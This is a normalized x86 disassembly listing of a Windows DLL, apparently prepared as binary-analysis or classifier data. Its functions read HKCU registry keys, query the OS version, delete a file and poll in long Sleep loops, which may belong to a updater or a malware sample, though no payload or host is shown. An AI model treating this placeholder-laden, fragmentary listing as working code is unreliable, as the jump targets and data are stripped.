call sub_10021d73
sub_10007f6a
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
push [ esp + 0x4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov eax [ esp + 0x4 ]
mov [ ecx ] ax
jmp r-xdata
test eax eax
jle r-xdata
movzx eax ax
retn 0x4
sub_10007fa6
push 0x18
mov eax sub_1005295a
call sub_1002b2d9
mov esi ecx
mov [ ebp - 0x1c ] esi
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ ebp - 0x18 ] ebx
call sub_10007e90
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x20 ] bl
jne r-xdata
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x28 ]
call sub_10007f6a
movzx eax ax
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov [ ebp - 0x18 ] 0x4
jmp sub_10008034
mov [ ebp - 0x4 ] ebx
jmp sub_10008034
mov [ ebp - 0x18 ] 0x4
sub_10008004
mov ecx [ ebp - 0x1c ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_100080a5
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10008034
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ ebp - 0x18 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x24 ]
push eax
call sub_10007f1c
mov eax esi
call sub_1002b37e
retn 0x4
push ebx
push [ ebp - 0x18 ]
call sub_100081bf
sub_100080a5
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1005051f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
push ebx
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x98 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
and ecx 0x17
mov [ eax + 0x8 ] ecx
mov eax [ eax + 0xc ]
and eax ecx
je r-xdata
mov ecx [ esp + 0x98 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
xor ebx ebx
cmp [ ebp + 0xc ] bl
je r-xdata
test al 0x4
je r-xdata
push ebx
push ebx
push 0x2
pop ebx
test bl al
je r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_10001ebc
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xa4 ] ebx
call sub_10001eec
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
push r--data
lea ecx [ esp + 0x7c ]
call sub_10001ebc
lea eax [ esp + 0x78 ]
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0xa4 ] ebx
call sub_10001eec
mov [ esp + 0x50 ] r--data
push r--data
lea eax [ esp + 0x54 ]
jmp r-xdata
push r--data
lea ecx [ esp + 0x38 ]
call sub_10001ebc
lea eax [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x10 ]
mov [ esp + 0xa4 ] 0x1
call sub_10001eec
mov [ esp + 0xc ] r--data
push r--data
lea eax [ esp + 0x10 ]
jmp r-xdata
call sub_1002ae74
push eax
jmp r-xdata
sub_100081e0
push esi
mov esi ecx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
test [ eax + 0x8 ] 0x6
jne r-xdata
mov eax esi
pop esi
retn
mov eax [ eax + 0x28 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x30 ]
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x0
push 0x4
add edx esi
call sub_100081bf
sub_10008233
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi ecx
and [ edi ] 0x0
test esi esi
je r-xdata
call sub_10027827
test ebx ebx
je r-xdata
mov edx [ esi + 0x18 ]
lea eax [ esi + 0x4 ]
cmp edx 0x10
jb r-xdata
mov ecx eax
mov ecx [ eax ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
cmp ecx ebx
ja r-xdata
mov ecx [ esi + 0x14 ]
add ecx eax
cmp ebx ecx
jbe r-xdata
mov eax [ eax ]
mov [ edi ] esi
mov [ edi + 0x4 ] ebx
mov eax edi
pop edi
pop esi
pop ebx
retn 0x8
sub_10008282
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
lea eax [ ecx + 0x4 ]
mov eax [ ecx + 0x4 ]
jmp r-xdata
push ecx
mov ecx [ ecx + 0x14 ]
add ecx eax
push ecx
mov ecx [ esp + 0xc ]
call sub_10008233
mov eax [ esp + 0x4 ]
retn 0x4
sub_100082bc
push 0x1c
mov eax sub_10052016
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
push 0x4
mov eax esi
call sub_1000d482
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x10 ]
lea ecx [ esi + 0x18 ]
mov [ esi ] r--data
call sub_100025cf
mov ecx [ ebp + 0xc ]
lea eax [ esi + 0x34 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1000113a
lea ecx [ esi + 0xd8 ]
call sub_10001bdf
push r--data
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x3
call sub_10001362
lea edi [ esi + 0xf4 ]
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x4
push eax
lea ecx [ edi + 0x4 ]
mov [ edi ] r--data
call sub_100025cf
and [ edi + 0x20 ] 0x0
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000264e
lea edi [ esi + 0x118 ]
push 0x4
mov eax edi
mov [ ebp + 0x10 ] edi
call sub_1000d482
mov [ ebp - 0x4 ] 0x7
mov [ edi ] r--data
add edi 0x18
push edi
call sub_10002f1b
cmp [ esi + 0x68 ] 0x0
jne r-xdata
mov eax esi
call sub_1002b37e
retn 0xc
mov [ esi + 0x68 ] 0xa4cb80
sub_1000839d
push 0x4
mov eax sub_10051fb1
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
lea ecx [ esi + 0x118 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000d911
lea ecx [ esi + 0xf4 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000d4e7
push 0x0
push 0x1
lea ecx [ esi + 0xd8 ]
call sub_1000264e
lea edi [ esi + 0x34 ]
call sub_100026f6
push 0x0
push 0x1
lea ecx [ esi + 0x18 ]
call sub_1000264e
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_1000d4bd
call sub_1002b37e
retn
sub_1000841e
push 0x64
mov eax sub_10051544
call sub_1002b30f
mov eax [ ecx + 0x14 ]
mov esi edx
cmp eax [ esi + 0x14 ]
jae r-xdata
mov edx [ esi + 0x14 ]
push edx
sub eax edx
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_10009533
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
call sub_1000736c
push eax
mov eax esi
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0x1
call sub_1000988e
pop ecx
mov esi eax
lea ecx [ ebp - 0x30 ]
call sub_1000736c
push eax
lea eax [ ebp - 0x2c ]
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000988e
pop ecx
mov ecx eax
mov eax esi
mov [ ebp - 0x4 ] 0x4
call sub_10006e2c
push 0x0
push 0x1
lea ecx [ ebp - 0x50 ]
mov bl al
call sub_1000264e
lea ecx [ ebp - 0x30 ]
call sub_10007dbd
push 0x0
push 0x1
lea ecx [ ebp - 0x6c ]
call sub_1000264e
lea ecx [ ebp - 0x34 ]
call sub_10007dbd
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000264e
mov al bl
xor al al
jmp r-xdata
call sub_1002b392
retn
sub_10008501
cmp [ ebp - 0x31 ] 0x0
je r-xdata
call sub_1002b3a1
retn
lea eax [ ebp - 0x30 ]
call sub_10008409
lea edx [ esi + 0x4c ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000841e
mov ecx esi
test al al
je r-xdata
call sub_100089cc
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
call sub_10008a4b
sub_10008543
push 0x268
mov eax sub_10051f4f
call sub_1002b30f
call sub_1001597f
mov [ ebp - 0x248 ] r--data
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x248 ] r--data
lea eax [ ebp - 0x248 ]
xor esi esi
push eax
lea edi [ ebp - 0x240 ]
mov [ ebp - 0x4 ] esi
call sub_100159ff
test al al
jne r-xdata
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x274 ]
call sub_10001362
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x1
mov ebx [ edi + 0xc ]
lea esi [ ebp - 0x250 ]
call sub_1000986e
lea ecx [ ebp - 0x248 ]
mov [ ebp - 0x248 ] r--data
call sub_10016c58
mov eax esi
call sub_1002b392
retn
call sub_10027827
cmp eax [ ebp - 0x258 ]
je r-xdata
xor bl bl
lea esi [ ebp - 0x250 ]
call sub_1000957d
mov edx eax
lea ecx [ ebp - 0x274 ]
call sub_1000841e
mov bl 0x1
cmp al bl
je r-xdata
mov eax [ ebp - 0x24c ]
cmp eax [ ebp - 0x254 ]
je r-xdata
mov esi [ ebp - 0x238 ]
jmp r-xdata
lea eax [ ebp - 0x248 ]
push eax
lea edi [ ebp - 0x240 ]
call sub_10015aaa
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x274 ]
mov [ ebp - 0x4 ] 0x0
call sub_1000264e
test bl bl
jne r-xdata
call sub_100037a1
jmp r-xdata
xor esi esi
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov ebx [ edi + 0x10 ]
lea esi [ ebp - 0x258 ]
call sub_1000986e
mov eax [ ebp - 0x250 ]
test eax eax
je r-xdata
sub_10008670
push ebp
sub esp 0xdc
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xdc ] eax
push 0x120
mov eax sub_10052925
call sub_1002b2d9
push r--data
lea ecx [ ebp + 0xa4 ]
call sub_10001362
xor esi esi
push r--data
lea ecx [ ebp ]
mov [ ebp - 0x4 ] esi
call sub_10001362
lea eax [ ebp - 0xa4 ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100091b4
lea ecx [ ebp ]
push ecx
push eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100098a8
push r--data
push eax
lea eax [ ebp + 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_100098f3
add esp 0x1c
push esi
push 0x1
lea ecx [ ebp - 0x88 ]
call sub_1000264e
push esi
push 0x1
lea ecx [ ebp - 0xa4 ]
call sub_1000264e
push __dos_header
lea ebx [ ebp + 0xc0 ]
mov [ ebp - 0x4 ] 0x7
call sub_100158ba
pop ecx
lea eax [ ebp + 0x88 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x8
call sub_10006e2c
xor ebx ebx
cmp al bl
jne r-xdata
push ebx
push 0x1
lea ecx [ ebp + 0xc0 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
lea eax [ ebp + 0x88 ]
push eax
lea ecx [ ebp + 0xc0 ]
call sub_10015b55
pop ecx
lea eax [ ebp - 0x12c ]
push eax
call sub_1000313a
push r--data
lea eax [ ebp + 0x88 ]
push eax
lea eax [ ebp - 0x124 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0xa
call sub_1000993a
pop ecx
pop ecx
push eax
call sub_100060a3
pop ecx
pop ecx
push eax
call sub_1000993a
push eax
call sub_10009a93
add esp 0xc
push r--data
lea ecx [ ebp - 0x50 ]
mov [ ebp - 0x11 ] 0x1
call sub_10001362
push r--data
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x4 ] 0xb
call sub_10001362
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x6c ]
push eax
push 0x80000001
lea eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x4 ] 0xc
call sub_10014a6c
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x6c ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp - 0x50 ]
call sub_1000264e
lea eax [ ebp + 0xa4 ]
push eax
lea eax [ ebp + 0x1c ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_10014fe0
cmp al 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xf
jmp r-xdata
lea eax [ ebp + 0xa4 ]
push eax
lea eax [ ebp + 0x60 ]
push eax
lea eax [ ebp + 0x1c ]
push eax
call sub_10014b9d
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp + 0x60 ]
push eax
mov [ ebp - 0x4 ] 0x11
call sub_100150f9
push eax
lea eax [ ebp + 0xc0 ]
push eax
mov [ ebp - 0x4 ] 0x12
call sub_10009218
pop ecx
pop ecx
push ebx
push esi
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x14
call sub_1000264e
push r--data
lea ecx [ ebp + 0x44 ]
call sub_10001362
mov [ ebp - 0x4 ] 0x15
mov ecx [ ebp + 0x58 ]
cmp ecx [ ebp + 0xd4 ]
jbe r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
jae r-xdata
mov [ ebp - 0x11 ] 0x1
jmp r-xdata
lea ecx [ ebp + 0x1c ]
call sub_10014b74
lea eax [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x6
call sub_10002793
push ebx
push 0x1
lea ecx [ ebp + 0x88 ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp ]
call sub_1000264e
push ebx
push 0x1
lea ecx [ ebp + 0xa4 ]
call sub_1000264e
mov al [ ebp - 0x11 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0xdc ]
xor ecx ebp
call sub_10027150
add ebp 0xe0
leave
retn
lea ecx [ ebp - 0x34 ]
lea eax [ ebp - 0x12c ]
call sub_10003269
lea ecx [ ebp + 0xa4 ]
push ecx
lea ecx [ ebp + 0x60 ]
push ecx
mov edi eax
mov [ ebp - 0x4 ] 0x17
call sub_1001517a
pop ecx
pop ecx
push ebx
push 0x1
lea ecx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x19
call sub_1000264e
lea eax [ ebp + 0x1c ]
push eax
lea ecx [ ebp + 0x60 ]
call sub_10014f5b
lea esi [ ebp + 0x60 ]
mov [ ebp - 0x4 ] 0xf
call sub_100150b1
cmp [ ebp + 0xd8 ] 0x8
mov eax [ ebp + 0xc4 ]
jae r-xdata
mov [ ebp - 0x11 ] bl
jmp r-xdata
push ebx
push esi
lea ecx [ ebp + 0x44 ]
call sub_1000264e
push ebx
push esi
lea ecx [ ebp + 0xc0 ]
call sub_1000264e
lea esi [ ebp + 0x60 ]
mov [ ebp - 0x4 ] 0x10
call sub_100150b1
push [ ebp + 0xd4 ]
push eax
push ecx
push ebx
lea ecx [ ebp + 0x44 ]
call sub_10006e80
cmp eax ebx
setge [ ebp - 0x11 ]
lea eax [ ebp + 0xc4 ]
sub_100089cc
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10052c07
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x28 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea eax [ esp + 0xc ]
push eax
call sub_10002f1b
and [ esp + 0x30 ] 0x0
lea eax [ esi + 0x4c ]
push eax
lea eax [ esp + 0x10 ]
call sub_10001443
lea eax [ esp + 0xc ]
push eax
lea ebx [ esi + 0xf4 ]
call sub_10008e81
pop ecx
lea esi [ esp + 0xc ]
call sub_100015ca
push [ esp + 0xc ]
call sub_100272e8
pop ecx
mov ecx [ esp + 0x28 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10008a4b
push ebp
sub esp 0xa8
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xa8 ] eax
push 0x48
mov eax sub_10052bd7
call sub_1002b2d9
mov edi ecx
xor ebx ebx
push ebx
lea eax [ ebp - 0x54 ]
mov [ ebp - 0x1c ] edi
call sub_1000d482
mov [ ebp - 0x54 ] r--data
lea eax [ ebp - 0x54 ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_10014945
lea eax [ edi + 0x18 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
call sub_10008ef7
pop ecx
pop ecx
push 0xffffffff
push ebx
push eax
lea ecx [ edi + 0xd8 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000253c
push ebx
push 0x1
lea ecx [ ebp - 0x38 ]
mov [ ebp - 0x4 ] bl
call sub_1000264e
lea ecx [ edi + 0xf4 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
push 0xfa0
call [ Sleep@IAT ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x4 ] 0x2
lea ecx [ edi + 0x34 ]
push eax
mov [ ebp ] r--data
call sub_1000113a
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1000b17a
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x28 ]
cmp esi [ ebp - 0x24 ]
jbe r-xdata
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] esi
call sub_10027827
mov eax [ ebp - 0x18 ]
cmp eax ebx
je r-xdata
call sub_10027827
call sub_10027827
cmp eax [ ebp - 0x34 ]
je r-xdata
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10009555
lea ecx [ ebp ]
call sub_1000af6d
mov [ ebp - 0x4 ] ebx
jmp r-xdata
lea esi [ ebp - 0x18 ]
call sub_1000957d
cmp [ eax ] ebx
je r-xdata
cmp [ ebp - 0x14 ] esi
je r-xdata
push edi
call sub_10008dd7
lea esi [ ebp - 0x18 ]
call sub_100095a5
jmp r-xdata
call sub_1000957d
mov edx [ eax ]
push ecx
push ecx
mov ecx esp
add eax 0x4
mov [ ebp - 0x3c ] esp
mov [ ecx ] edx
push eax
add ecx 0x4
call sub_1000af36
lea esi [ edi + 0x118 ]
call sub_1000d946
mov esi [ ebp - 0x24 ]
cmp [ ebp - 0x28 ] esi
jbe r-xdata
sub_10008ba8
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10052862
mov eax [ fs : 0x0 ]
push eax
sub esp 0x198
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x190 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1a8 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea edi [ esp + 0x14 ]
mov [ esp + 0x24 ] esi
call sub_1000dd94
xor ebx ebx
mov [ esp + 0x1b0 ] ebx
push ebx
lea ecx [ esp + 0x4c ]
mov [ esp + 0x64 ] 0xf
call sub_100021a7
mov [ esp + 0x1b0 ] 0x1
mov ecx [ esp + 0x14 ]
cmp ecx ebx
je r-xdata
lea eax [ esp + 0x68 ]
lea edi [ esi + 0x34 ]
push eax
mov ecx edi
mov [ esp + 0x68 ] r--data
call sub_1000113a
add esi 0xd8
push esi
lea eax [ esp + 0x110 ]
push eax
mov ecx edi
mov [ esp + 0x1b8 ] 0x3
call sub_1000f29b
lea eax [ esp + 0x48 ]
push eax
lea eax [ esp + 0x110 ]
push eax
lea ebx [ esp + 0x24 ]
lea esi [ esp + 0x6c ]
mov [ esp + 0x1b8 ] 0x4
call sub_1000b014
mov [ esp + 0x1b0 ] 0x5
mov ecx [ esp + 0x1c ]
xor edi edi
cmp ecx edi
je r-xdata
lea edi [ esp + 0x2c ]
call sub_1000df90
push 0xffffffff
push ebx
push eax
lea ecx [ esp + 0x54 ]
mov [ esp + 0x1bc ] 0x2
call sub_100021c3
push ebx
push 0x1
mov ecx edi
mov [ esp + 0x1b8 ] 0x1
call sub_100020e2
mov eax [ esp + 0x14 ]
cmp eax edi
je r-xdata
push ecx
push ecx
mov eax esp
mov [ eax ] ecx
lea ecx [ esp + 0x28 ]
mov [ esp + 0x30 ] esp
push ecx
lea ecx [ eax + 0x4 ]
call sub_1000af36
mov esi [ esp + 0x2c ]
add esi 0x118
call sub_1000d946
cmp [ esp + 0x1c ] edi
jne r-xdata
cmp [ eax + 0x1c ] 0x8
jb r-xdata
mov [ esp + 0x1b0 ] 0x4
mov ecx [ esp + 0x20 ]
cmp ecx edi
je r-xdata
mov [ esp + 0x1b0 ] 0x4
mov ecx [ esp + 0x20 ]
cmp ecx edi
je r-xdata
add eax 0x8
mov eax [ eax + 0x8 ]
jmp r-xdata
lea ecx [ esp + 0x10c ]
call sub_1000f32a
lea ecx [ esp + 0x64 ]
call sub_1000af6d
push edi
push 0x1
lea ecx [ esp + 0x50 ]
call sub_100020e2
or [ esp + 0x1b0 ] 0xffffffff
mov ecx [ esp + 0x18 ]
cmp ecx edi
je r-xdata
call sub_1000af0a
lea ecx [ esp + 0x10c ]
call sub_1000f32a
lea ecx [ esp + 0x64 ]
call sub_1000af6d
push edi
push 0x1
lea ecx [ esp + 0x50 ]
call sub_100020e2
or [ esp + 0x1b0 ] 0xffffffff
mov ecx [ esp + 0x18 ]
cmp ecx edi
je r-xdata
call sub_1000af0a
push eax
call [ DeleteFileW@IAT ]
cmp [ esp + 0x14 ] edi
jne r-xdata
mov al 0x1
call sub_1000af0a
xor al al
jmp r-xdata
call sub_1000af0a
mov ecx [ esp + 0x1a8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x190 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
sub_10008dd7
push 0x1c
mov eax sub_10052b9a
call sub_1002b2d9
mov esi [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
push 0x2bf20
call [ Sleep@IAT ]
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_100095d0
pop ecx
lea ebx [ esi + 0x34 ]
lea ecx [ esi + 0x34 ]
call sub_10002c35
and [ ebp - 0x4 ] 0x0
mov ecx esi
call sub_10008ba8
cmp al 0x1
jne r-xdata
mov edi 0x3e8
push edi
call [ Sleep@IAT ]
lea eax [ ebp - 0x28 ]
push eax
call sub_100095d0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
lea ecx [ ebp - 0x28 ]
call sub_100096c4
pop ecx
pop ecx
mov ecx ebx
call sub_10002c35
push 0x0
push edi
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_1002e5d0
mov ecx [ esi + 0x68 ]
xor edi edi
cmp edx edi
jl r-xdata
jg r-xdata
cmp eax ecx
jb r-xdata
jmp r-xdata
sub_10008e81
push 0x8
mov eax sub_10052b7f
call sub_1002b2a6
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
jne r-xdata
call sub_1002b37e
retn
mov esi [ Sleep@IAT ]
mov [ ebp - 0x14 ] r--data
mov edi 0x7d0
jmp r-xdata
push [ ebp + 0x8 ]
call sub_10008543
pop ecx
mov [ ebp - 0x10 ] eax
push edi
test eax eax
je r-xdata
call esi
call esi
push [ ebp - 0x10 ]
and [ ebp - 0x4 ] 0x0
call sub_10020210
push edi
call esi
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
jne r-xdata
push 0x1b7740
call esi
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
test al al
je r-xdata
sub_10008ef7
push 0x194
mov eax sub_100527f8
call sub_1002b345
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xac ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
push r--data
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0xb4 ] eax
mov [ ebp - 0xb0 ] ebx
call sub_10001362
xor edi edi
inc edi
push r--data
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] edi
call sub_10001362
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0xf8 ]
push eax
push 0x80000001
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014a6c
push ebx
push edi
lea ecx [ ebp - 0xf8 ]
call sub_1000264e
push ebx
push edi
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000264e
lea eax [ ebp - 0x1a0 ]
push eax
call sub_1000313a
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0x7
call sub_10001362
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
mov [ ebp - 0x4 ] 0x8
call sub_10014b9d
push ebx
push edi
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000264e
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x58 ]
push eax
call sub_100150f9
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x198 ]
push eax
mov [ ebp - 0x4 ] 0xb
call sub_100060a3
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x30 ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x7
lea esi [ ebp - 0x58 ]
call sub_100150b1
mov [ ebp - 0x4 ] 0x6
jmp sub_10009141
sub_10009012
mov eax [ ebp - 0xdc ]
cmp [ eax + 0x28 ] 0x2
je r-xdata
mov eax [ ebp - 0x1a0 ]
mov eax [ eax + 0x4 ]
lea eax [ ebp + eax - 0x1a0 ]
mov ecx [ eax + 0x28 ]
neg ecx
sbb ecx ecx
xor ebx ebx
and ecx 0xfffffffc
push ebx
add ecx 0x4
push eax
call sub_100080a5
lea eax [ ebp - 0xd0 ]
push eax
call sub_10016bda
pop ecx
push [ ebp - 0xb4 ]
mov esi eax
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
push ecx
movsd [ edi ] [ esi ]
push r--data
push ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x20 ]
push ecx
shr eax 0x10
push eax
push ecx
push [ ebp - 0x20 ]
lea eax [ ebp - 0x198 ]
push ecx
push [ ebp - 0x24 ]
push eax
call sub_1000935d
pop ecx
push eax
call sub_1000926b
pop ecx
push eax
call sub_1000926b
pop ecx
push eax
call sub_10009448
pop ecx
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_100060a3
pop ecx
pop ecx
lea ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x1a0 ]
call sub_10003269
push r--data
lea ecx [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xd
call sub_10001362
lea eax [ ebp - 0xd8 ]
push eax
lea eax [ ebp - 0xa8 ]
push eax
lea edi [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0xe
call sub_1001517a
pop ecx
pop ecx
xor edi edi
push ebx
inc edi
mov [ ebp - 0x4 ] 0x10
push edi
lea ecx [ ebp - 0xd8 ]
call sub_1000264e
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0xa8 ]
call sub_10014f5b
lea esi [ ebp - 0xa8 ]
mov [ ebp - 0x4 ] 0xd
call sub_100150b1
push ebx
push edi
lea ecx [ ebp - 0x4c ]
call sub_1000264e
mov [ ebp - 0x4 ] 0x6
mov eax r-xdata
retn
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
sub_10009141
call [ GetVersion@IAT ]
push eax
push ecx
push r--data
push ecx
lea eax [ ebp - 0x198 ]
push r--data
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000993a
add esp 0xc
push eax
call sub_1000935d
mov ecx [ ebp - 0xac ]
lea eax [ ebp - 0x1a0 ]
call sub_10003269
lea eax [ ebp - 0x1a0 ]
mov [ ebp - 0xb0 ] edi
mov [ ebp - 0x4 ] 0x5
call sub_10002793
lea ecx [ ebp - 0x80 ]
call sub_10014b74
mov eax [ ebp - 0xac ]
call sub_1002b3a1
retn
sub_100091b4
push 0x3c
mov eax sub_10051501
call sub_1002b2a6
and [ ebp - 0x10 ] 0x0
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10001362
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x48 ]
push eax
lea ebx [ ebp - 0x2c ]
call sub_10015bc4
mov [ ebp - 0x4 ] 0x1
mov [ esp ] r--data
push eax
push [ ebp + 0x8 ]
call sub_100098f3
add esp 0xc
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1000264e
push 0x0
push 0x1
mov ecx ebx
call sub_1000264e
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
sub_10009218
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
push esi
